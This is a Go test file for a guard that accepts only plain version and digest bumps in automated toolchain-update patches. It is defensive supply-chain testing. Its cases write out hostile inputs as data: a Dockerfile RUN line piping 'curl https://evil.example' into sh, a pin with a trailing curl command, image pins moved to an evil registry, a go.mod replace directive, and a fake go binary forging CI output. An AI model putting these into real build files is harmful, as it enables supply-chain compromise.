// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package testkit

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/omkhar/workcell/internal/metadatautil"
)

// toolchainGuardFiles are the files a toolchain candidate may change, plus a
// workflow and a provider file that it may not.
var toolchainGuardFiles = []string{
	".github/workflows/release.yml",
	"go.mod",
	"policy/tool-pins.toml",
	"runtime/container/Dockerfile",
	"runtime/container/debian-bootstrap.env",
	"runtime/container/providers/package.json",
	"runtime/container/rust/Cargo.toml",
	"runtime/container/rust/rust-toolchain.toml",
	"scripts/check-dead-code.sh",
	"scripts/ci/build-validator-image.sh",
	"tools/validator/Dockerfile",
}

// newToolchainGuardRepo commits the toolchain files as HEAD has them in this
// checkout, so a patch made in the fixture also applies to this checkout.
func newToolchainGuardRepo(t *testing.T) string {
	t.Helper()
	repo := filepath.Join(t.TempDir(), "repo")
	mustMkdir(t, repo)
	publishGit(t, repo, nil, "init", "-q")
	for _, rel := range toolchainGuardFiles {
		mode := os.FileMode(0o644)
		if strings.HasSuffix(rel, ".sh") {
			mode = 0o755
		}
		path := filepath.Join(repo, filepath.FromSlash(rel))
		mustMkdir(t, filepath.Dir(path))
		mustWrite(t, path, publishGitRaw(t, repoRoot(t), "show", "HEAD:"+rel), mode)
	}
	ident := []string{"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com"}
	publishGit(t, repo, nil, "add", "-A")
	publishGit(t, repo, ident, "-c", "commit.gpgsign=false", "commit", "-q", "-m", "base")
	return repo
}

// toolchainGuardCandidate writes the patch and tree the way
// upstream-refresh-candidate.sh does, then restores HEAD.
func toolchainGuardCandidate(t *testing.T, repo string) (patchPath, tree string) {
	t.Helper()
	publishGit(t, repo, nil, "add", "-A")
	patch := publishGitRaw(t, repo, "diff", "--cached", "--binary", "--full-index", "--patch", "--no-ext-diff", "--no-color")
	tree = publishGit(t, repo, nil, "write-tree")
	publishGit(t, repo, nil, "reset", "-q", "--hard")
	publishGit(t, repo, nil, "clean", "-fdq")
	patchPath = filepath.Join(t.TempDir(), "patch")
	mustWrite(t, patchPath, patch, 0o644)
	return patchPath, tree
}

// toolchainGuardEdit replaces the first match of pattern in one file.
func toolchainGuardEdit(t *testing.T, repo, rel, pattern, replacement string) {
	t.Helper()
	splitEdit(t, repo, rel, pattern, replacement)
	if strings.HasSuffix(rel, ".sh") {
		if err := os.Chmod(filepath.Join(repo, filepath.FromSlash(rel)), 0o755); err != nil {
			t.Fatal(err)
		}
	}
}

var (
	toolchainGuardDigestA = strings.Repeat("a", 64)
	toolchainGuardDigestB = strings.Repeat("b", 64)
)

// toolchainGuardFullBump edits every pin line the toolchain updater writes.
func toolchainGuardFullBump(t *testing.T, repo string) {
	t.Helper()
	edit := func(rel, pattern, replacement string) { toolchainGuardEdit(t, repo, rel, pattern, replacement) }
	edit("go.mod", `(?m)^go .*$`, "go 1.99.0")
	edit("go.mod", `(?m)^toolchain go.*$`, "toolchain go1.99.1")
	for _, key := range []string{"cosign", "buildx", "syft"} {
		edit("policy/tool-pins.toml", `(?m)^`+key+` = ".*"$`, key+` = "v99.0.0"`)
	}
	for _, key := range []string{"actionlint", "zizmor"} {
		edit("policy/tool-pins.toml", `(?m)^`+key+`_version = ".*"$`, key+`_version = "99.0.0"`)
		edit("policy/tool-pins.toml", `(?m)^`+key+`_sha256 = ".*"$`, key+`_sha256 = "`+toolchainGuardDigestA+`"`)
	}
	edit("policy/tool-pins.toml", `(?m)^(buildkit = "[^@]+@sha256:)[0-9a-f]{64}"$`, "${1}"+toolchainGuardDigestA+`"`)
	edit("policy/tool-pins.toml", `(?m)^qemu = ".*"$`, `qemu = "tonistiigi/binfmt:qemu-v99.0.0-1@sha256:`+toolchainGuardDigestA+`"`)
	edit("scripts/ci/build-validator-image.sh", `(?m)^(BUILDKIT_IMAGE="\$\{WORKCELL_BUILDKIT_IMAGE:-[^@]+@sha256:)[0-9a-f]{64}\}"$`, "${1}"+toolchainGuardDigestA+`}"`)
	for _, rel := range []string{"runtime/container/Dockerfile", "tools/validator/Dockerfile"} {
		edit(rel, `(?m)^ARG GO_VERSION=.*$`, "ARG GO_VERSION=1.99.1")
		edit(rel, `(?m)^ARG GO_LINUX_X86_64_SHA256=.*$`, "ARG GO_LINUX_X86_64_SHA256="+toolchainGuardDigestA)
		edit(rel, `(?m)^ARG GO_LINUX_ARM64_SHA256=.*$`, "ARG GO_LINUX_ARM64_SHA256="+toolchainGuardDigestB)
		edit(rel, `(?m)^ARG RUST_VERSION=.*$`, "ARG RUST_VERSION=99.0.1")
	}
	edit("runtime/container/Dockerfile", `(?m)^(ARG NODE_BASE_IMAGE=[^@]+@sha256:)[0-9a-f]{64}$`, "${1}"+toolchainGuardDigestA)
	edit("runtime/container/Dockerfile", `(?m)^ARG RUST_TOOLCHAIN_IMAGE=.*$`, "ARG RUST_TOOLCHAIN_IMAGE=rust:99.0.1-slim-trixie@sha256:"+toolchainGuardDigestA)
	edit("tools/validator/Dockerfile", `(?m)^(ARG VALIDATOR_BASE_IMAGE=[^@]+@sha256:)[0-9a-f]{64}$`, "${1}"+toolchainGuardDigestA)
	edit("tools/validator/Dockerfile", `(?m)^ARG HADOLINT_VERSION=.*$`, "ARG HADOLINT_VERSION=v99.0.0")
	edit("tools/validator/Dockerfile", `(?m)^ARG DEADCODE_VERSION=.*$`, "ARG DEADCODE_VERSION=v99.0.0")
	edit("tools/validator/Dockerfile", `(?m)^ARG RUSTUP_VERSION=.*$`, "ARG RUSTUP_VERSION=99.0.0")
	edit("tools/validator/Dockerfile", `(?m)^ARG RUSTUP_INIT_LINUX_ARM64_SHA256=.*$`, "ARG RUSTUP_INIT_LINUX_ARM64_SHA256="+toolchainGuardDigestA)
	edit("scripts/check-dead-code.sh", `(?m)^readonly DEADCODE_VERSION=".*"$`, `readonly DEADCODE_VERSION="v99.0.0"`)
	edit("runtime/container/rust/Cargo.toml", `(?m)^rust-version = ".*"$`, `rust-version = "99.0"`)
	edit("runtime/container/rust/rust-toolchain.toml", `(?m)^channel = ".*"$`, `channel = "99.0.1"`)
	edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_SNAPSHOT=.*$`, "DEBIAN_SNAPSHOT=20991231T000000Z")
	edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_OPENSSL_AMD64_PATH=.*$`, "DEBIAN_OPENSSL_AMD64_PATH=pool/main/o/openssl/openssl_9.9.9-1~deb13u1_amd64.deb")
	edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_OPENSSL_AMD64_SHA256=.*$`, "DEBIAN_OPENSSL_AMD64_SHA256="+toolchainGuardDigestA)
	edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_CA_CERTIFICATES_PATH=.*$`, "DEBIAN_CA_CERTIFICATES_PATH=pool/main/c/ca-certificates/ca-certificates_20991231_all.deb")
	edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_CA_CERTIFICATES_SHA256=.*$`, "DEBIAN_CA_CERTIFICATES_SHA256="+toolchainGuardDigestB)
}

func TestUpstreamRefreshToolchainScopeGuardPassesAFullBump(t *testing.T) {
	t.Parallel()
	repo := newToolchainGuardRepo(t)
	base := publishGit(t, repo, nil, "rev-parse", "HEAD")
	toolchainGuardFullBump(t, repo)
	patch, tree := toolchainGuardCandidate(t, repo)
	verdict, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, patch)
	if err != nil {
		t.Fatalf("the guard rejected a full toolchain bump: %v", err)
	}
	if verdict.Base != base || verdict.Tree != tree || verdict.String() != "passed:"+base+":"+tree {
		t.Fatalf("verdict = %+v, want base %s and the candidate tree %s", verdict, base, tree)
	}
	if status := publishGit(t, repo, nil, "status", "--porcelain"); status != "" {
		t.Fatalf("the guard changed the work tree or index:\n%s", status)
	}
}

func TestUpstreamRefreshToolchainScopeGuardRejectsOutOfScopeChanges(t *testing.T) {
	t.Parallel()
	edit := func(rel, pattern, replacement string) func(*testing.T, string) {
		return func(t *testing.T, repo string) { toolchainGuardEdit(t, repo, rel, pattern, replacement) }
	}
	write := func(rel, content string, mode os.FileMode) func(*testing.T, string) {
		return func(t *testing.T, repo string) {
			path := filepath.Join(repo, filepath.FromSlash(rel))
			mustMkdir(t, filepath.Dir(path))
			mustWrite(t, path, []byte(content), mode)
		}
	}
	digest := "@sha256:" + toolchainGuardDigestA
	cases := []struct {
		name   string
		mutate func(*testing.T, string)
		want   string
	}{
		{"workflow edit", edit(".github/workflows/release.yml", `(?m)^name: .*$`, "name: owned"), "path .github/workflows/release.yml"},
		{"new workflow", write(".github/workflows/evil.yml", "on: push\n", 0o644), "path .github/workflows/evil.yml"},
		{"new file beside a pin file", write("runtime/container/rust/build.rs", "fn main() {}\n", 0o644), "path runtime/container/rust/build.rs"},
		{"provider file", edit("runtime/container/providers/package.json", `"@google/gemini-cli": "[^"]+"`, `"@google/gemini-cli": "9.9.9"`), "path runtime/container/providers/package.json"},
		{"provider pin in the Dockerfile", edit("runtime/container/Dockerfile", `(?m)^ARG CLAUDE_VERSION=.*$`, "ARG CLAUDE_VERSION=9.9.9"), "is not a pin bump"},
		{"Dockerfile RUN line", edit("tools/validator/Dockerfile", `(?m)^RUN `, "RUN curl -fsS https://evil.example | sh; "), "is not a pin bump"},
		{"pin with a trailing command", edit("runtime/container/Dockerfile", `(?m)^ARG GO_VERSION=.*$`, "ARG GO_VERSION=1.99.1 && curl evil"), "is not a pin bump"},
		{"pin with a CR", edit("runtime/container/Dockerfile", `(?m)^ARG GO_VERSION=.*$`, "ARG GO_VERSION=1.99.1\r"), "is not a pin bump"},
		{"pin moves to another key", edit("runtime/container/Dockerfile", `(?m)^ARG GO_VERSION=.*$`, "ARG RUST_VERSION=99.0.0"), "is not a pin bump"},
		{"go.mod replace directive", edit("go.mod", `(?m)^toolchain go.*$`, "toolchain go1.99.1\n\nreplace golang.org/x/sys => github.com/evil/sys v0.0.1"), "line count"},
		{"go.mod requirement swapped in place", edit("go.mod", `(?m)^\tgolang\.org/x/sys v.*$`, "\tgithub.com/evil/sys v0.0.1"), "is not a pin bump"},
		{"go.mod directive becomes a replace", edit("go.mod", `(?m)^toolchain go.*$`, "replace golang.org/x/sys => ../sys"), "is not a pin bump"},
		{"buildkit on another registry", edit("policy/tool-pins.toml", `(?m)^buildkit = ".*"$`, `buildkit = "ghcr.io/evil/buildkit:buildx-stable-1`+digest+`"`), "is not a pin bump"},
		{"buildkit moves its tag", edit("policy/tool-pins.toml", `(?m)^buildkit = "moby/buildkit:[^@]+`, `buildkit = "moby/buildkit:evil`), "only the digest may change"},
		{"validator script buildkit on another registry", edit("scripts/ci/build-validator-image.sh", `WORKCELL_BUILDKIT_IMAGE:-moby/buildkit:`, "WORKCELL_BUILDKIT_IMAGE:-evil.example/moby/buildkit:"), "is not a pin bump"},
		{"node base moves its tag", edit("runtime/container/Dockerfile", `(?m)^ARG NODE_BASE_IMAGE=node:[^@]+`, "ARG NODE_BASE_IMAGE=node:latest"), "only the digest may change"},
		{"node base on another registry", edit("tools/validator/Dockerfile", `(?m)^ARG VALIDATOR_BASE_IMAGE=node:`, "ARG VALIDATOR_BASE_IMAGE=docker.io/evil/node:"), "is not a pin bump"},
		{"rust image on another registry", edit("runtime/container/Dockerfile", `(?m)^ARG RUST_TOOLCHAIN_IMAGE=rust:`, "ARG RUST_TOOLCHAIN_IMAGE=ghcr.io/evil/rust:"), "is not a pin bump"},
		{"qemu on another tag", edit("policy/tool-pins.toml", `(?m)^qemu = ".*"$`, `qemu = "tonistiigi/binfmt:latest`+digest+`"`), "is not a pin bump"},
		{"digest in upper case", edit("runtime/container/Dockerfile", `(?m)^ARG GO_LINUX_X86_64_SHA256=.*$`, "ARG GO_LINUX_X86_64_SHA256="+strings.Repeat("A", 64)), "is not a pin bump"},
		{"digest too short", edit("tools/validator/Dockerfile", `(?m)^ARG HADOLINT_LINUX_ARM64_SHA256=.*$`, "ARG HADOLINT_LINUX_ARM64_SHA256=abc"), "is not a pin bump"},
		{"version moves back", edit("runtime/container/Dockerfile", `(?m)^ARG GO_VERSION=.*$`, "ARG GO_VERSION=1.0.0"), "moves back"},
		{"tool pin moves back", edit("policy/tool-pins.toml", `(?m)^cosign = ".*"$`, `cosign = "v0.0.1"`), "moves back"},
		{"Debian snapshot moves back", edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_SNAPSHOT=.*$`, "DEBIAN_SNAPSHOT=20000101T000000Z"), "moves back"},
		{"Debian package from another source", edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_OPENSSL_AMD64_PATH=.*$`, "DEBIAN_OPENSSL_AMD64_PATH=pool/main/e/evil/openssl_9.9.9_amd64.deb"), "is not a pin bump"},
		{"Go checksum without its version", edit("runtime/container/Dockerfile", `(?m)^ARG GO_LINUX_X86_64_SHA256=.*$`, "ARG GO_LINUX_X86_64_SHA256="+toolchainGuardDigestA), "GO_LINUX_X86_64_SHA256= changes without ARG GO_VERSION="},
		{"rustup-init checksum without its version", edit("tools/validator/Dockerfile", `(?m)^ARG RUSTUP_INIT_LINUX_ARM64_SHA256=.*$`, "ARG RUSTUP_INIT_LINUX_ARM64_SHA256="+toolchainGuardDigestA), "RUSTUP_INIT_LINUX_ARM64_SHA256= changes without ARG RUSTUP_VERSION="},
		{"actionlint checksum without its version", edit("policy/tool-pins.toml", `(?m)^actionlint_sha256 = ".*"$`, `actionlint_sha256 = "`+toolchainGuardDigestA+`"`), `actionlint_sha256 = " changes without actionlint_version = "`},
		{"Debian package path without the snapshot", edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_OPENSSL_AMD64_PATH=.*$`, "DEBIAN_OPENSSL_AMD64_PATH=pool/main/o/openssl/openssl_1.1.1n-0+deb11u5_amd64.deb"), "DEBIAN_OPENSSL_AMD64_PATH= changes without DEBIAN_SNAPSHOT="},
		{"Debian checksum without its path", edit("runtime/container/debian-bootstrap.env", `(?m)^DEBIAN_CA_CERTIFICATES_SHA256=.*$`, "DEBIAN_CA_CERTIFICATES_SHA256="+toolchainGuardDigestA), "DEBIAN_CA_CERTIFICATES_SHA256= changes without DEBIAN_CA_CERTIFICATES_PATH="},
		{"shell pin loses its closing brace and quote", edit("scripts/ci/build-validator-image.sh", `(?m)^(BUILDKIT_IMAGE="\$\{WORKCELL_BUILDKIT_IMAGE:-[^@]+@sha256:)[0-9a-f]{64}\}"$`, "${1}"+toolchainGuardDigestA), "is not a pin bump"},
		{"TOML pin loses its closing quote", edit("policy/tool-pins.toml", `(?m)^cosign = ".*"$`, `cosign = "v99.0.0`), "is not a pin bump"},
		{"version too large to compare", edit("policy/tool-pins.toml", `(?m)^cosign = ".*"$`, `cosign = "v99999999999999999999.0.0"`), "too large to compare"},
		{"ORAS pin the updater never writes", edit("policy/tool-pins.toml", `(?m)^oras_version = ".*"$`, `oras_version = "9.9.9"`), "is not a pin bump"},
		{"mode change", func(t *testing.T, repo string) {
			if err := os.Chmod(filepath.Join(repo, "go.mod"), 0o755); err != nil {
				t.Fatal(err)
			}
		}, "go.mod: mode 100644 to 100755"},
		{"file becomes a symlink", func(t *testing.T, repo string) {
			path := filepath.Join(repo, "runtime", "container", "rust", "Cargo.toml")
			if err := os.Remove(path); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink("../../../go.mod", path); err != nil {
				t.Fatal(err)
			}
		}, "runtime/container/rust/Cargo.toml: change status T"},
		{"file deleted", func(t *testing.T, repo string) {
			if err := os.Remove(filepath.Join(repo, "scripts", "check-dead-code.sh")); err != nil {
				t.Fatal(err)
			}
		}, "scripts/check-dead-code.sh: change status D"},
		{"file renamed", func(t *testing.T, repo string) {
			publishGit(t, repo, nil, "mv", "go.mod", "go.mod.orig")
		}, "go.mod: change status D"},
		{"last newline removed", func(t *testing.T, repo string) {
			path := filepath.Join(repo, "runtime", "container", "rust", "rust-toolchain.toml")
			data, err := os.ReadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			mustWrite(t, path, []byte(strings.TrimSuffix(string(data), "\n")), 0o644)
		}, "line count"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			repo := newToolchainGuardRepo(t)
			// A real bump comes with the attack, so the guard must find the
			// one bad change among good ones.
			toolchainGuardEdit(t, repo, "tools/validator/Dockerfile", `(?m)^ARG HADOLINT_VERSION=.*$`, "ARG HADOLINT_VERSION=v99.0.0")
			tc.mutate(t, repo)
			patch, _ := toolchainGuardCandidate(t, repo)
			_, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, patch)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("guard error = %v, want %q", err, tc.want)
			}
		})
	}
}

// TestUpstreamRefreshToolchainScopeGuardRejectsADuplicatedKey covers a base
// that already holds a key twice: Docker reads the last assignment and the
// updater the first, so a change to either is not a plain bump.
func TestUpstreamRefreshToolchainScopeGuardRejectsADuplicatedKey(t *testing.T) {
	t.Parallel()
	repo := newToolchainGuardRepo(t)
	toolchainGuardEdit(t, repo, "runtime/container/Dockerfile", `(?m)^(ARG GO_VERSION=.*)$`, "${1}\n${1}")
	ident := []string{"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com"}
	publishGit(t, repo, nil, "add", "-A")
	publishGit(t, repo, ident, "-c", "commit.gpgsign=false", "commit", "-q", "-m", "duplicate")
	re := regexp.MustCompile(`(?m)^ARG GO_VERSION=.*\nARG GO_VERSION=.*$`)
	toolchainGuardEdit(t, repo, "runtime/container/Dockerfile", re.String(), "ARG GO_VERSION=1.27.3\nARG GO_VERSION=1.99.1")
	patch, _ := toolchainGuardCandidate(t, repo)
	if _, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, patch); err == nil || !strings.Contains(err.Error(), "must appear once") {
		t.Fatalf("guard error = %v, want a duplicate key rejection", err)
	}
}

// toolchainGuardCommit commits the fixture work tree as the new HEAD.
func toolchainGuardCommit(t *testing.T, repo string) {
	t.Helper()
	ident := []string{"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com"}
	publishGit(t, repo, nil, "add", "-A")
	publishGit(t, repo, ident, "-c", "commit.gpgsign=false", "commit", "-q", "-m", "base")
}

// TestUpstreamRefreshToolchainScopeGuardOrdersBuildSuffixes covers a version
// whose numbers are a prefix of the old one: dropping the QEMU build suffix
// moves the version back, and adding one moves it forward.
func TestUpstreamRefreshToolchainScopeGuardOrdersBuildSuffixes(t *testing.T) {
	t.Parallel()
	qemu := func(version, digest string) string {
		return `qemu = "tonistiigi/binfmt:qemu-v` + version + `@sha256:` + digest + `"`
	}
	for _, tc := range []struct{ from, to, want string }{
		{"10.2.3-68", "10.2.3", "moves back"},
		{"10.2.3", "10.2.3-68", ""},
		// The shared components are equal, so only the extra run differs. A
		// number too large to compare there still fails.
		{"10.2.3", "10.2.3-99999999999999999999", "too large to compare"},
		{"10.2.3-99999999999999999999", "10.2.3", "too large to compare"},
	} {
		repo := newToolchainGuardRepo(t)
		toolchainGuardEdit(t, repo, "policy/tool-pins.toml", `(?m)^qemu = ".*"$`, qemu(tc.from, toolchainGuardDigestA))
		toolchainGuardCommit(t, repo)
		toolchainGuardEdit(t, repo, "policy/tool-pins.toml", `(?m)^qemu = ".*"$`, qemu(tc.to, toolchainGuardDigestB))
		patch, _ := toolchainGuardCandidate(t, repo)
		_, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, patch)
		if tc.want == "" && err != nil || tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)) {
			t.Fatalf("qemu %s to %s: guard error = %v, want %q", tc.from, tc.to, err, tc.want)
		}
	}
}

func TestUpstreamRefreshToolchainScopeGuardRejectsBadPatches(t *testing.T) {
	t.Parallel()
	repo := newToolchainGuardRepo(t)
	dir := t.TempDir()
	for name, patch := range map[string]string{
		"empty patch":            "",
		"patch for another base": "diff --git a/go.mod b/go.mod\n--- a/go.mod\n+++ b/go.mod\n@@ -1 +1 @@\n-module example.invalid/other\n+module example.invalid/evil\n",
	} {
		path := filepath.Join(dir, strings.ReplaceAll(name, " ", "-"))
		mustWrite(t, path, []byte(patch), 0o644)
		if verdict, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, path); err == nil {
			t.Fatalf("%s: guard passed with verdict %+v", name, verdict)
		}
	}
	link := filepath.Join(dir, "link")
	if err := os.Symlink(filepath.Join(dir, "empty-patch"), link); err != nil {
		t.Fatal(err)
	}
	if _, err := metadatautil.CheckUpstreamRefreshToolchainScope(repo, link); err == nil {
		t.Fatal("guard followed a symlinked patch")
	}
}

// cloneWorkingTree clones this checkout into a temporary repository that
// shares its objects, with the same HEAD, and copies in each modified or
// untracked file, so a script test runs the code under test without touching
// this checkout, its index or its work tree.
func cloneWorkingTree(t *testing.T) string {
	t.Helper()
	clone := filepath.Join(t.TempDir(), "workcell")
	publishGit(t, t.TempDir(), nil, "clone", "-q", "--shared", repoRoot(t), clone)
	for _, rel := range strings.Split(string(publishGitRaw(t, repoRoot(t), "ls-files", "-z", "--modified", "--others", "--exclude-standard")), "\x00") {
		if rel == "" {
			continue
		}
		source := filepath.Join(repoRoot(t), filepath.FromSlash(rel))
		info, err := os.Lstat(source)
		if os.IsNotExist(err) {
			continue
		}
		if err != nil {
			t.Fatal(err)
		}
		if !info.Mode().IsRegular() {
			continue
		}
		target := filepath.Join(clone, filepath.FromSlash(rel))
		mustMkdir(t, filepath.Dir(target))
		mustWrite(t, target, mustReadFile(t, source), info.Mode().Perm())
	}
	return clone
}

// TestUpstreamRefreshToolchainScopeGuardScript runs the wrapper the workflow
// runs, from a clone of this checkout. It checks the patch against HEAD of the
// clone and writes the verdict to the output file only when the guard passes.
// An inherited GIT_DIR or GIT_INDEX_FILE does not move what the guard reads.
func TestUpstreamRefreshToolchainScopeGuardScript(t *testing.T) {
	t.Parallel()
	clone := cloneWorkingTree(t)
	script := filepath.Join(clone, "scripts", "ci", "upstream-refresh-scope-guard.sh")
	head := publishGit(t, clone, nil, "rev-parse", "HEAD")
	run := func(dir string, env []string, args ...string) (string, error) {
		out, err := execRetryETXTBSY(func() *exec.Cmd {
			cmd := exec.Command(script, args...)
			cmd.Dir = dir
			cmd.Env = append(os.Environ(), env...)
			return cmd
		})
		return string(out), err
	}

	good := newToolchainGuardRepo(t)
	toolchainGuardFullBump(t, good)
	goodPatch, _ := toolchainGuardCandidate(t, good)
	// The tree the guard checks is HEAD of the clone plus the patch.
	index := []string{"GIT_INDEX_FILE=" + filepath.Join(t.TempDir(), "index")}
	publishGit(t, clone, index, "read-tree", "HEAD")
	publishGit(t, clone, index, "apply", "--cached", "--binary", goodPatch)
	goodTree := publishGit(t, clone, index, "write-tree")
	work := t.TempDir()
	mustWrite(t, filepath.Join(work, "patch"), mustReadFile(t, goodPatch), 0o644)
	mustWrite(t, filepath.Join(work, "output"), []byte("other=1\n"), 0o644)
	// A hostile caller environment points git at the fixture repository and
	// at an index file of its own. The guard strips both.
	strayIndex := filepath.Join(t.TempDir(), "stray-index")
	hostile := []string{"GIT_DIR=" + filepath.Join(good, ".git"), "GIT_WORK_TREE=" + good, "GIT_INDEX_FILE=" + strayIndex, "GIT_OBJECT_DIRECTORY=" + filepath.Join(good, ".git", "objects")}
	// Relative paths resolve against the caller directory.
	if out, err := run(work, hostile, "--toolchain", "patch", "output"); err != nil {
		t.Fatalf("the guard script rejected a full toolchain bump: %v\n%s", err, out)
	}
	if got, want := string(mustReadFile(t, filepath.Join(work, "output"))), "other=1\nverdict=passed:"+head+":"+goodTree+"\n"; got != want {
		t.Fatalf("step output = %q, want %q", got, want)
	}
	if _, err := os.Lstat(strayIndex); !os.IsNotExist(err) {
		t.Fatalf("the guard wrote the inherited GIT_INDEX_FILE: %v", err)
	}

	bad := newToolchainGuardRepo(t)
	toolchainGuardEdit(t, bad, ".github/workflows/release.yml", `(?m)^name: .*$`, "name: owned")
	badPatch, _ := toolchainGuardCandidate(t, bad)
	output := filepath.Join(t.TempDir(), "output")
	mustWrite(t, output, nil, 0o644)
	if out, err := run(t.TempDir(), nil, "--toolchain", badPatch, output); err == nil || !strings.Contains(out, "path .github/workflows/release.yml") {
		t.Fatalf("the guard script passed a workflow edit: %v\n%s", err, out)
	}
	if data := mustReadFile(t, output); len(data) != 0 {
		t.Fatalf("a failed guard wrote a step output: %q", data)
	}
	for _, args := range [][]string{{"--toolchain", badPatch}, {"--toolchain"}, {badPatch, output}} {
		if out, err := run(t.TempDir(), nil, args...); err == nil || !strings.Contains(out, "Usage:") {
			t.Fatalf("guard script %q: %v\n%s, want a usage error", args, err, out)
		}
	}

	// The wrapper writes only a well-formed verdict, whatever the Go command
	// prints. A stand-in go prints each malformed verdict and exits 0. It also
	// appends to GITHUB_OUTPUT when it can, which the wrapper must prevent.
	fakeDir := t.TempDir()
	fakeGo := filepath.Join(fakeDir, "go")
	mustWrite(t, fakeGo, []byte("#!/bin/sh\n[ -z \"${GITHUB_OUTPUT:-}\" ] || echo verdict=forged >>\"${GITHUB_OUTPUT}\"\nprintf '%s' \"${FAKE_VERDICT}\"\n"), 0o700)
	hex := strings.Repeat("a", 40)
	for _, verdict := range []string{
		"",
		"passed",
		"passed:" + hex,
		"passed:" + hex + ":" + strings.Repeat("a", 39),
		"passed:" + strings.ToUpper(hex) + ":" + hex,
		"passed:" + hex + ":" + hex + "\nverdict=passed:" + hex + ":" + hex,
		"failed:" + hex + ":" + hex,
		" passed:" + hex + ":" + hex,
	} {
		output := filepath.Join(t.TempDir(), "output")
		mustWrite(t, output, nil, 0o644)
		out, err := run(t.TempDir(), []string{"WORKCELL_GO_BIN=" + fakeGo, "FAKE_VERDICT=" + verdict, "GITHUB_OUTPUT=" + output}, "--toolchain", goodPatch, output)
		if err == nil || !strings.Contains(out, "printed no verdict") {
			t.Fatalf("verdict %q: wrapper error = %v, want a refusal\n%s", verdict, err, out)
		}
		if data := mustReadFile(t, output); len(data) != 0 {
			t.Fatalf("verdict %q: the wrapper wrote %q", verdict, data)
		}
	}
	goodVerdict := "passed:" + hex + ":" + hex
	output = filepath.Join(t.TempDir(), "output")
	mustWrite(t, output, nil, 0o644)
	if out, err := run(t.TempDir(), []string{"WORKCELL_GO_BIN=" + fakeGo, "FAKE_VERDICT=" + goodVerdict, "GITHUB_OUTPUT=" + output}, "--toolchain", goodPatch, output); err != nil {
		t.Fatalf("wrapper refused a well-formed verdict: %v\n%s", err, out)
	}
	if data := string(mustReadFile(t, output)); data != "verdict="+goodVerdict+"\n" {
		t.Fatalf("output = %q, want only the wrapper's verdict", data)
	}
	if staged := publishGit(t, clone, nil, "diff", "--cached", "--name-only"); staged != "" {
		t.Fatalf("the guard staged into the clone index:\n%s", staged)
	}
}

func mustReadFile(t *testing.T, path string) []byte {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return data
}
